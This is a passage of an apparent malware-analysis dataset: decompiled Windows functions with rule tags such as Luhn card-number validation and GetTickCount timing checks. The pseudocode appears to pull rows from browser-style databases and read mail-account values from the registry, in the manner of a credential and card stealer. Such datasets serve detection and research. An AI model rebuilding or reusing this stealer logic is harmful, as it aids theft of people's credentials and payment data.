(**0x469258)(&var_114h, *0x4583e0);\n    (**0x469258)(&var_114h, 0x445418);\n    (**0x469258)(&var_114h, arg_10h);\n    (**0x469258)(&var_114h, 0x447474);\n    (**0x469258)(&var_114h, arg_ch);\n    (**0x469258)(&var_114h, 0x445410);\n    uVar2 = *0x458070;\n    iVar1 = (**0x4587b8)(&var_218h, &var_244h);\n    if (iVar1 == 0) {\n        iVar1 = (**0x458764)(var_244h, uVar2, 0xffffffff, &var_23dh + 1, 0);\n        if (iVar1 == 0) {\n            uVar2 = (**0x4692b4)(0, 999999);\n            var_238h = (**0x46923c)(uVar2);\n            iVar1 = (**0x458780)(stack0xfffffdc0);\n            while (iVar1 == 100) {\n                uVar2 = (**0x4587a4)(unique0x10000593, 0);\n                uVar3 = (**0x4587a4)(stack0xfffffdc0, 1);\n                uVar4 = (**0x4587a4)(stack0xfffffdc0, 2);\n                uVar5 = (**0x4587a4)(stack0xfffffdc0, 3);\n                pcVar6 = (**0x4587a4)(stack0xfffffdc0, 4);\n                uVar7 = (**0x4587a4)(stack0xfffffdc0, 5);\n                iVar1 = (**0x469288)(uVar3, 0x447470);\n                if (iVar1 == 0) {\n                    fcn.0042acb0(uVar3, 0, 4);\n                    uVar9 = *0x4580c8;\n                }\n                else {\n                    fcn.0042acb0(uVar3, 0, 4);\n                    uVar9 = *0x4584e8;\n                }\n                (**0x469258)(uVar3, uVar9);\n                iVar1 = (**0x469288)(uVar5, 0x447470);\n                if (iVar1 == 0) {\n                    fcn.0042acb0(uVar5, 0, 4);\n                    uVar9 = *0x4580c8;\n                }\n                else {\n                    fcn.0042acb0(uVar5, 0, 4);\n                    uVar9 = *0x4584e8;\n                }\n                (**0x469258)(uVar5, uVar9);\n                if (*pcVar6 == '-') {\n                    fcn.0042acb0(pcVar6, 0, 4);\n                    (**0x469258)(pcVar6, 0x447470);\n                }\n                (**0x469258)(var_238h, uVar2);\n                (**0x469258)(var_238h, 0x44745c);\n                (**0x469258)(var_238h, uVar3);\n                (**0x469258)(var_238h, 0x44745c);\n                (**0x469258)(var_238h, uVar4);\n                (**0x469258)(var_238h, 0x44745c);\n                (**0x469258)(var_238h, uVar5);\n                (**0x469258)(var_238h, 0x44745c);\n                (**0x469258)(var_238h, pcVar6);\n                (**0x469258)(var_238h, 0x44745c);\n                (**0x469258)(var_238h, uVar7);\n                (**0x469258)(var_238h, 0x44745c);\n                uVar2 = arg_14h;\n                uVar3 = arg_18h;\n                uVar4 = (**0x45878c)(stack0xfffffdc0, 6);\n                uVar5 = (**0x458794)(stack0xfffffdc0, 6);\n                puVar8 = fcn.0041ac80(&var_234h, uVar5, uVar4, uVar2, uVar3);\n                var_4h = 0;\n                if (0xf < puVar8[5]) {\n                    puVar8 = *puVar8;\n                }\n                (**0x469258)(var_238h, puVar8);\n                var_4h = 0xffffffff;\n                if (0xf < var_220h) {\n                    fcn.0042ac49(var_234h);\n                }\n                var_220h = 0xf;\n                var_224h = 0;\n                var_234h = var_234h & 0xffffff00;\n                (**0x469258)(var_238h, 0x44540c);\n                iVar1 = (**0x458780)(stack0xfffffdc0);\n            }\n            uVar2 = (**0x469150)(var_238h);\n            fcn.00429fe0(arg_1ch, &var_114h, var_238h, uVar2);\n            fcn.0042acb0(&var_238h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffdc0);\n        (**0x4587bc)(var_244h);\n    }\n    (**0x46915c)(&var_218h);\ncode_r0x0041b629:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1872
    },
    "0041b650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b650(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_23dh;\n    uint var_238h;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ecdb;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042acb0(&var_114h, 0, 0x104, var_10h);\n    (**0x469258)(&var_114h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    arg_8h_00 = &var_114h;\n    (**0x469258)(arg_8h_00, uVar1);\n    (**0x469100)(arg_8h, &var_114h, 1);\n    fcn.0042acb0(&var_218h, 0, 0x104);\n    (**0x4690ac)(&var_218h, 0x447ac8, arg_10h, arg_ch);\n    uVar1 = *0x457f0c;\n    iVar2 = (**0x4587b8)(&var_114h, &var_244h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_244h, uVar1, 0xffffffff, &var_23dh + 1, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x4692b4)(0, 999999);\n            var_238h = (**0x46923c)(uVar1);\n            iVar2 = (**0x458780)(stack0xfffffdc0);\n            while (iVar2 == 100) {\n                uVar1 = (**0x4587a4)(unique0x100003a1, 0);\n                uVar3 = (**0x4587a4)(stack0xfffffdc0, 1);\n                uVar4 = (**0x4587a4)(stack0xfffffdc0, 2);\n                (**0x469258)(var_238h, 0x447ac0);\n                (**0x469258)(var_238h, uVar1);\n                (**0x469258)(var_238h, 0x44540c);\n                (**0x469258)(var_238h, 0x447ab8);\n                (**0x469258)(var_238h, uVar3);\n                (**0x469258)(var_238h, 0x44540c);\n                (**0x469258)(var_238h, 0x447ab0);\n                (**0x469258)(var_238h, uVar4);\n                (**0x469258)(var_238h, 0x44540c);\n                (**0x469258)(var_238h, 0x447aa8);\n                uVar1 = arg_14h;\n                uVar3 = arg_18h;\n                uVar4 = (**0x45878c)(stack0xfffffdc0, 3);\n                arg_ch_00 = (**0x458794)(stack0xfffffdc0, 3);\n                puVar5 = fcn.0041ac80(&var_234h, arg_ch_00, uVar4, uVar1, uVar3);\n                var_4h = 0;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                (**0x469258)(var_238h, puVar5);\n                var_4h = 0xffffffff;\n                if (0xf < var_220h) {\n                    fcn.0042ac49(var_234h);\n                }\n                var_220h = 0xf;\n                var_224h = 0;\n                var_234h = var_234h & 0xffffff00;\n                (**0x469258)(var_238h, 0x447030);\n                iVar2 = (**0x458780)(stack0xfffffdc0);\n            }\n            uVar1 = (**0x469150)(var_238h);\n            fcn.00429fe0(arg_1ch, &var_218h, var_238h, uVar1);\n            fcn.0042acb0(&var_238h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffdc0);\n        (**0x4587bc)(var_244h);\n    }\n    (**0x46915c)(&var_114h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1237
    },
    "0041bdf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bdf0(uchar *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *arg_10h_00;\n    uint uVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint32_t var_80h;\n    uint var_70h;\n    uint32_t var_6ch;\n    uint var_64h;\n    uint32_t var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ed38;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_84h = 0;\n    var_88h = 0;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    var_4h = 1;\n    iVar1 = fcn.0041aa00(arg_14h, &var_84h, &var_88h);\n    uVar2 = (**0x4692b4)(8, var_88h);\n    iVar3 = (**0x46923c)(uVar2);\n    if (iVar3 == 0) {\n        if (var_84h != 0) {\n            uVar2 = (**0x4692b4)(0, var_84h);\n            (**0x4692e0)(uVar2);\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.0042b420(0x4453cc);\n        fcn.00406270(0x4453cc, 0x4453cc);\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n    }\n    else {\n        fcn.0042b811(iVar3, var_88h, var_84h);\n        if (var_84h != 0) {\n            uVar2 = (**0x4692b4)(0, var_84h);\n            (**0x4692e0)(uVar2);\n            var_84h = 0;\n        }\n        var_98h = iVar1;\n        if (iVar1 == 0xff) {\n            fcn.0041aa00(iVar3, &var_84h, &var_88h);\n            uVar2 = (**0x4692b4)(0, iVar3);\n            (**0x4692e0)(uVar2);\n            uVar2 = (**0x4692b4)(8, var_88h);\n            iVar3 = (**0x46923c)(uVar2);\n            if (iVar3 != 0) {\n                fcn.0042b811(iVar3, var_88h, var_84h);\n                if (var_84h != 0) {\n                    uVar2 = (**0x4692b4)(0, var_84h);\n                    (**0x4692e0)(uVar2);\n                    var_84h = 0;\n                }\n                var_98h = fcn.0041aa00(iVar3, &var_84h, &var_88h);\n                uVar2 = (**0x4692b4)(0, iVar3);\n                (**0x4692e0)(uVar2);\n                uVar2 = (**0x4692b4)(8, var_88h);\n                iVar3 = (**0x46923c)(uVar2);\n                if (iVar3 != 0) {\n                    fcn.0042b811(iVar3, var_88h, var_84h);\n                    if (var_84h != 0) {\n                        uVar2 = (**0x4692b4)(0, var_84h);\n                        (**0x4692e0)(uVar2);\n                        var_84h = 0;\n                    }\n                    goto code_r0x0041c0d5;\n                }\n                if (var_84h != 0) {\ncode_r0x0041c06e:\n                    uVar2 = (**0x4692b4)(0, var_84h);\n                    (**0x4692e0)(uVar2);\n                }\n                fcn.00406370(0x4453cc);\n                fcn.00405ce0();\n                fcn.00405ce0();\n                goto code_r0x0041c451;\n            }\ncode_r0x0041bf9e:\n            if (var_84h != 0) {\n                uVar2 = (**0x4692b4)(0, var_84h);\n                (**0x4692e0)(uVar2);\n            }\n            *(arg_8h + 0x14) = 0xf;\n            *(arg_8h + 0x10) = 0;\n            *arg_8h = 0;\n            uVar2 = fcn.0042b420(0x4453cc);\n            fcn.00406270(0x4453cc, uVar2);\n        }\n        else {\ncode_r0x0041c0d5:\n            iVar4 = fcn.0041aa00(iVar3, &var_84h, &var_88h);\n            uVar2 = (**0x4692b4)(0, iVar3);\n            (**0x4692e0)(uVar2);\n            uVar2 = (**0x4692b4)(8, var_88h);\n            iVar3 = (**0x46923c)(uVar2);\n            if (iVar3 == 0) goto code_r0x0041bf9e;\n            fcn.0042b811(iVar3, var_88h, var_84h);\n            if (var_84h != 0) {\n                uVar2 = (**0x4692b4)(0, var_84h);\n                (**0x4692e0)(uVar2);\n            }\n            iVar5 = (**0x469150)(iVar3);\n            iVar5 = iVar5 + iVar4 * -2 + 1;\n            uVar2 = (**0x4692b4)(8, iVar5);\n            var_84h = (**0x46923c)(uVar2);\n            if (var_84h == 0) {\n                fcn.00406370(0x4453cc);\n            }\n            else {\n                var_88h = fcn.00406370(iVar3);\n                var_4h = CONCAT31(var_4h._1_3_, 2);\n                uVar2 = (**0x469150)(iVar3);\n                arg_10h_00 = fcn.0040e670(&var_80h, iVar4 * 2, uVar2);\n                if (0xf < arg_10h_00[5]) {\n                    arg_10h_00 = *arg_10h_00;\n                }\n                fcn.0042b811(var_84h, iVar5, arg_10h_00);\n                if (0xf < var_6ch) {\n                    fcn.0042ac49(var_80h);\n                }\n                var_6ch = 0xf;\n                var_70h = 0;\n                var_80h = var_80h & 0xffffff00;\n                var_4h = CONCAT31(var_4h._1_3_, 1);\n                if (0xf < var_50h) {\n                    fcn.0042ac49(var_64h);\n                }\n                uVar2 = (**0x4692b4)(0, iVar3);\n                (**0x4692e0)(uVar2);\n                var_88h = (**0x469150)(var_84h);\n                var_88h = var_88h + 1;\n                uVar2 = (**0x4692b4)(8, var_88h);\n                iVar3 = (**0x46923c)(uVar2);\n                if (iVar3 == 0) goto code_r0x0041c06e;\n                fcn.0042b811(iVar3, var_88h, var_84h);\n                uVar2 = (**0x4692b4)(0, var_84h);\n                (**0x4692e0)(uVar2);\n                var_84h = 0;\n                var_8ch = 0;\n                if (0 < var_98h) {\n                    do {\n                        uVar2 = fcn.0041aa00(iVar3, &var_84h, &var_88h);\n                        uVar6 = (**0x4692b4)(0, iVar3);\n                        (**0x4692e0)(uVar6);\n                        uVar6 = (**0x4692b4)(8, var_88h);\n                        iVar3 = (**0x46923c)(uVar6);\n                        if (iVar3 == 0) {\n                            if (var_84h != 0) {\n                                uVar2 = (**0x4692b4)(0, var_84h);\n                                (**0x4692e0)(uVar2);\n                            }\n                            fcn.00406370(0x4453cc);\n                            if (0xf < var_18h) {\n                                fcn.0042ac49(var_2ch);\n                            }\n                            goto joined_r0x0041c4b6;\n                        }\n                        fcn.0042b811(iVar3, var_88h, var_84h);\n                        if (var_84h != 0) {\n                            uVar6 = (**0x4692b4)(0, var_84h);\n                            (**0x4692e0)(uVar6);\n                            var_84h = 0;\n                        }\n                        fcn.0040bc10(1, uVar2);\n                        var_8ch = var_8ch + 1;\n                    } while (var_8ch < var_98h);\n                }\n                if (iVar1 == 0xff) {\n                    uVar2 = fcn.00406370(arg_ch);\n                    var_4h._0_1_ = 3;\n                    fcn.004063b0(uVar2);\n                    var_4h._0_1_ = 1;\n                    if (0xf < var_50h) {\n                        fcn.0042ac49(var_64h);\n                    }\n                    uVar2 = fcn.0042b420(arg_10h);\n                    fcn.0040baf0(arg_10h, uVar2);\n                    uVar2 = fcn.0040e670(&var_64h, var_1ch, var_38h);\n                    var_4h._0_1_ = 4;\n                    fcn.004063b0(uVar2);\n                    var_4h = CONCAT31(var_4h._1_3_, 1);\n                    if (0xf < var_50h) {\n                        fcn.0042ac49(var_64h);\n                    }\n                }\n                uVar2 = (**0x4692b4)(0, iVar3);\n                (**0x4692e0)(uVar2);\n                *(arg_8h + 0x14) = 0xf;\n                *(arg_8h + 0x10) = 0;\n                *arg_8h = 0;\n                fcn.004063b0(&var_48h);\n            }\n        }\n        if (0xf < var_18h) {\n            fcn.0042ac49(var_2ch);\n        }\n    }\njoined_r0x0041c4b6:\n    var_2ch = var_2ch & 0xffffff00;\n    var_1ch = 0;\n    var_18h = 0xf;\n    if (0xf < var_34h) {\n        var_18h = 0xf;\n        var_1ch = 0;\n        fcn.0042ac49(var_48h);\n    }\ncode_r0x0041c451:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_14h);\n    return;\n}\n",
        "token_count": 2941
    },
    "0041c4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c4c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_dech;\n    uint var_de8h;\n    uint var_de4h;\n    uint var_de0h;\n    uint var_ddch;\n    uint var_dd8h;\n    uint var_dd4h;\n    uint var_dd0h;\n    int32_t var_dcch;\n    uint var_dc8h;\n    char var_dc2h;\n    int32_t var_dc0h;\n    uint32_t var_dbch;\n    uint var_dach;\n    uint32_t var_da8h;\n    uint32_t var_da0h;\n    uint var_d90h;\n    uint32_t var_d8ch;\n    uint32_t var_d84h;\n    uint var_d74h;\n    uint32_t var_d70h;\n    uint32_t var_d68h;\n    uint var_d58h;\n    uint32_t var_d54h;\n    uint32_t var_d4ch;\n    uint var_d3ch;\n    uint32_t var_d38h;\n    uint *var_d30h;\n    uint var_d20h;\n    uint32_t var_d1ch;\n    uchar var_d14h;\n    uint var_d13h;\n    uchar var_914h;\n    uint var_913h;\n    uchar var_514h;\n    uint var_513h;\n    uchar var_114h;\n    uint var_113h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43edad;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_dcch = 0;\n    var_114h = 0;\n    fcn.0042acb0(&var_113h, 0, 0x103, var_10h);\n    var_dc8h = 0x104;\n    var_d14h = 0;\n    fcn.0042acb0(&var_d13h, 0, 0x3ff);\n    var_914h = 0;\n    fcn.0042acb0(&var_913h, 0, 0x3ff);\n    var_514h = 0;\n    fcn.0042acb0(&var_513h, 0, 0x3ff);\n    fcn.0042acb0(&var_d14h, 0, 0x400);\n    fcn.0042acb0(&var_914h, 0, 0x400);\n    fcn.0042acb0(&var_514h, 0, 0x400);\n    arg_8h_00 = &var_dc0h;\n    var_de0h = 0x400;\n    var_dd8h = 0x400;\n    var_ddch = 0x400;\n    iVar1 = (**0x4692e4)(0x80000001, 0x447b38, 0, 1);\n    uVar5 = *0x45839c;\n    if (iVar1 != 0) goto code_r0x0041cb05;\n    var_d70h = 0xf;\n    var_d74h = 0;\n    var_d84h = var_d84h & 0xffffff00;\n    uVar2 = fcn.0042b420(*0x45839c);\n    fcn.00406270(uVar5, uVar2);\n    uVar5 = *0x458578;\n    var_4h = 0;\n    var_d38h = 0xf;\n    var_d3ch = 0;\n    var_d4ch = var_d4ch & 0xffffff00;\n    uVar2 = fcn.0042b420(*0x458578);\n    fcn.00406270(uVar5, uVar2);\n    var_4h._0_1_ = 1;\n    puVar3 = fcn.00424320(&var_d68h, &var_d84h);\n    var_4h._0_1_ = 2;\n    puVar4 = fcn.00424320(&var_da0h, &var_d4ch);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    iVar1 = (**0x4690a0)(var_dc0h, puVar4, puVar3, 0x10, 0, &var_dd4h, &var_dech);\n    var_dc2h = iVar1 != 0;\n    if (7 < var_d8ch) {\n        fcn.0042ac49(var_da0h);\n    }\n    var_d8ch = 7;\n    var_d90h = 0;\n    var_da0h = var_da0h & 0xffff0000;\n    if (7 < var_d54h) {\n        fcn.0042ac49(var_d68h);\n    }\n    var_d54h = 7;\n    var_d58h = 0;\n    var_d68h = var_d68h & 0xffff0000;\n    if (0xf < var_d38h) {\n        fcn.0042ac49(var_d4ch);\n    }\n    var_d38h = 0xf;\n    var_d3ch = 0;\n    var_d4ch = var_d4ch & 0xffffff00;\n    var_4h = 0xffffffff;\n    if (0xf < var_d70h) {\n        fcn.0042ac49(var_d84h);\n    }\n    if (var_dc2h == '\\0') {\ncode_r0x0041c791:\n        if (var_dc0h != 0) {\n            (**0x469208)(var_dc0h);\n            var_dc0h = 0;\n        }\n    }\n    else if (var_dc0h != 0) {\n        (**0x469208)(var_dc0h);\n        var_dc0h = 0;\n        goto code_r0x0041c791;\n    }\n    iVar1 = (**0x4692e4)(0x80000001, 0x447ae0, 0, 9, &var_dc0h);\n    if (iVar1 == 0) {\n        iVar1 = (**0x4692ac)(var_dc0h, 0, &var_114h, &var_dc8h, 0, 0, 0, 0);\n        if (iVar1 == 0) {\n            do {\n                (**0x469258)(arg_8h, 0x44540c);\n                (**0x469258)(arg_8h, *0x457f18);\n                (**0x469258)(arg_8h, 0x44540c);\n                (**0x469258)(arg_8h, *0x4584bc);\n                (**0x469140)(var_dc0h, &var_114h, *0x457e78, 2, 0, &var_d14h, &var_de0h);\n                (**0x469258)(arg_8h, &var_d14h);\n                var_de8h = 4;\n                iVar1 = (**0x469140)(var_dc0h, &var_114h, *0x457fdc, 0xffff, 0, &var_de4h, &var_de8h);\n                if (iVar1 == 0) {\n                    puVar3 = fcn.004245b0(&var_d68h, var_de4h);\n                    var_4h = 4;\n                    if (0xf < puVar3[5]) {\n                        puVar3 = *puVar3;\n                    }\n                    (**0x469258)(arg_8h, puVar3);\n                    var_4h = 0xffffffff;\n                    if (0xf < var_d54h) {\n                        fcn.0042ac49(var_d68h);\n                    }\n                }\n                else {\n                    (**0x469258)(arg_8h, 0x447ad8);\n                }\n                (**0x469258)(arg_8h, 0x44540c);\n                (**0x469258)(arg_8h, *0x457f78);\n                (**0x469140)(var_dc0h, &var_114h, *0x458540, 2, 0, &var_914h, &var_dd8h);\n                (**0x469258)(arg_8h, &var_914h);\n                var_d1ch = 0xf;\n                var_d20h = 0;\n                var_d30h = var_d30h & 0xffffff00;\n                var_4h = 5;\n                (**0x469140)(var_dc0h, &var_114h, *0x458108, 2, 0, &var_514h, &var_ddch);\n                (**0x469258)(arg_8h, 0x44540c);\n                (**0x469258)(arg_8h, *0x458478);\n                iVar1 = (**0x469288)(&var_514h, 0x4453cc);\n                if (iVar1 != 0) {\n                    uVar5 = fcn.0041bdf0(&var_dbch, &var_d14h, &var_914h, &var_514h);\n                    var_4h._0_1_ = 6;\n                    fcn.004063b0(uVar5);\n                    var_4h = CONCAT31(var_4h._1_3_, 5);\n                    if (0xf < var_da8h) {\n                        fcn.0042ac49(var_dbch);\n                    }\n                    var_da8h = 0xf;\n                    var_dach = 0;\n                    var_dbch = var_dbch & 0xffffff00;\n                    puVar3 = var_d30h;\n                    if (var_d1ch < 0x10) {\n                        puVar3 = &var_d30h;\n                    }\n                    (**0x469258)(arg_8h, puVar3);\n                }\n                (**0x469258)(arg_8h, 0x447030);\n                var_dcch = var_dcch + 1;\n                var_dc8h = 0x104;\n                iVar1 = (**0x4692ac)(var_dc0h, var_dcch, &var_114h, &var_dc8h, 0, 0, 0, 0);\n                fcn.0042acb0(&var_914h, 0, 0);\n                fcn.0042acb0(&var_d30h, 0, 0);\n                fcn.0042acb0(&var_514h, 0, 0);\n                var_4h = 0xffffffff;\n                if (0xf < var_d1ch) {\n                    fcn.0042ac49(var_d30h);\n                }\n                var_d1ch = 0xf;\n                var_d20h = 0;\n                var_d30h = var_d30h & 0xffffff00;\n            } while (iVar1 != 0x103);\n        }\n        if (var_dc0h != 0) {\n            (**0x469208)(var_dc0h);\n        }\n    }\ncode_r0x0041cb05:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 2650
    },
    "0041cb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041cb30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_264h;\n    uint var_260h;\n    int32_t var_25ch;\n    int32_t var_258h;\n    uint32_t var_250h;\n    uint var_240h;\n    uint32_t var_23ch;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43edf6;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_258h = 0;\n    var_25ch = 0;\n    fcn.0042acb0(&var_218h, 0, 0x104, var_10h);\n    uVar1 = fcn.00421020(0x1c);\n    (**0x469258)(&var_218h, uVar1);\n    (**0x469258)(&var_218h, arg_8h);\n    fcn.0042acb0(&var_114h, 0, 0x104);\n    (**0x469258)(&var_114h, &var_218h);\n    (**0x469258)(&var_114h, 0x445418);\n    (**0x469258)(&var_114h, *0x458030);\n    var_220h = 0xf;\n    var_224h = 0;\n    var_234h = var_234h & 0xffffff00;\n    uVar1 = fcn.0042b420(&var_114h);\n    fcn.00406270(&var_114h, uVar1);\n    var_4h = 0;\n    puVar2 = fcn.00424320(&var_250h, &var_234h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    iVar3 = fcn.00420f60(puVar2);\n    if (7 < var_23ch) {\n        fcn.0042ac49(var_250h);\n    }\n    var_23ch = 7;\n    var_240h = 0;\n    var_250h = var_250h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_220h) {\n        fcn.0042ac49(var_234h);\n    }\n    var_220h = 0xf;\n    var_224h = 0;\n    var_234h = var_234h & 0xffffff00;\n    if (iVar3 != 0) {\n        iVar3 = fcn.0041a3a0(&var_114h, &var_258h, &var_25ch);\n        if (iVar3 == 0) {\n            fcn.00415a80(&var_258h, &var_25ch);\n        }\n    }\n    puVar2 = &var_218h;\n    fcn.0041b9c0(0x4453cc, puVar2, arg_ch, var_258h, var_25ch, *(in_ECX + 0x20), arg_10h, 0);\n    if (*(in_ECX + 6) != '\\0') {\n        fcn.00417ac0(&var_218h, arg_ch, 0);\n    }\n    if (var_258h != 0) {\n        (**0x46919c)(var_258h, 0);\n        var_258h = 0;\n    }\n    if (var_25ch != 0) {\n        (**0x469250)(var_25ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(puVar2);\n    return;\n}\n",
        "token_count": 999
    },
    "0041cdb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041cdb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint32_t var_364h;\n    int32_t var_360h;\n    int32_t var_35ch;\n    uint32_t var_354h;\n    uint var_344h;\n    uint32_t var_340h;\n    uint32_t var_338h;\n    uint var_328h;\n    uint32_t var_324h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ee36;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_35ch = 0;\n    var_360h = 0;\n    fcn.0042acb0(&var_218h, 0, 0x104, var_10h);\n    fcn.0042acb0(&var_31ch, 0, 0x104);\n    uVar1 = fcn.00421020(0x1a);\n    (**0x469258)(&var_218h, uVar1);\n    (**0x469258)(&var_218h, arg_8h);\n    (**0x469258)(&var_218h, arg_10h);\n    iVar2 = (**0x469288)(arg_10h, *0x45837c);\n    var_364h = iVar2 == 0;\n    iVar2 = (**0x469288)(arg_10h, *0x457dd8);\n    if (iVar2 == 0) {\n        var_364h = 2;\n    }\n    iVar2 = (**0x469288)(arg_10h, 0x4474b8);\n    if (iVar2 == 0) {\n        var_364h = 3;\n    }\n    uVar1 = fcn.00421020(0x1a);\n    (**0x469258)(&var_31ch, uVar1);\n    (**0x469258)(&var_31ch, arg_8h);\n    fcn.0042acb0(&var_114h, 0, 0x104);\n    (**0x469258)(&var_114h, &var_218h);\n    (**0x469258)(&var_114h, 0x445418);\n    (**0x469258)(&var_114h, *0x458030);\n    var_324h = 0xf;\n    var_328h = 0;\n    var_338h = var_338h & 0xffffff00;\n    uVar1 = fcn.0042b420(&var_114h);\n    fcn.00406270(&var_114h, uVar1);\n    var_4h = 0;\n    puVar3 = fcn.00424320(&var_354h, &var_338h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    iVar2 = fcn.00420f60(puVar3);\n    if (7 < var_340h) {\n        fcn.0042ac49(var_354h);\n    }\n    var_340h = 7;\n    var_344h = 0;\n    var_354h = var_354h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_324h) {\n        fcn.0042ac49(var_338h);\n    }\n    var_324h = 0xf;\n    var_328h = 0;\n    var_338h = var_338h & 0xffffff00;\n    if ((iVar2 != 0) && (iVar2 = fcn.0041a3a0(&var_114h, &var_35ch, &var_360h),  iVar2 == 0)) {\n        fcn.00415a80(&var_35ch, &var_360h);\n    }\n    puVar3 = &var_218h;\n    fcn.0041b9c0(0x4453cc, puVar3, arg_ch, var_35ch, var_360h, *(in_ECX + 0x20), arg_14h, arg_18h);\n    if (*(in_ECX + 6) != '\\0') {\n        fcn.00417ac0(&var_31ch, arg_ch, var_364h);\n    }\n    if (var_35ch != 